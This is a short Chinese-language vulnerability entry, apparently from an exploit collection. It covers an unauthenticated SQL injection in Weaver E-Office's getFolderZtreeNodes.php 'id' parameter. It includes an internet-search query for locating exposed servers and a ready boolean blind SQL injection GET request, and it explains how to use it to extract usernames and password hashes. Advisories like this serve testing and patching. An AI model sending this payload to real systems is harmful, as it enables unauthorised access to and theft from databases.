---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Office getFolderZtreeNodes.php SQL注入漏洞

## 漏洞描述

泛微 E-Office 的 `/inc/classic/tree/getFolderZtreeNodes.php` 文件中 `id` 参数存在SQL注入漏洞。攻击者无需登录，通过构造布尔盲注语句可逐位提取数据库敏感信息。

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

```
GET /inc/classic/tree/getFolderZtreeNodes.php?id=(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%20(1*(SELECT%201%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS))%20END)) HTTP/1.1
```

当条件为真时返回正常响应、为假时返回错误/异常响应，以此进行布尔盲注，逐步提取数据库中的用户名、密码哈希等敏感数据。
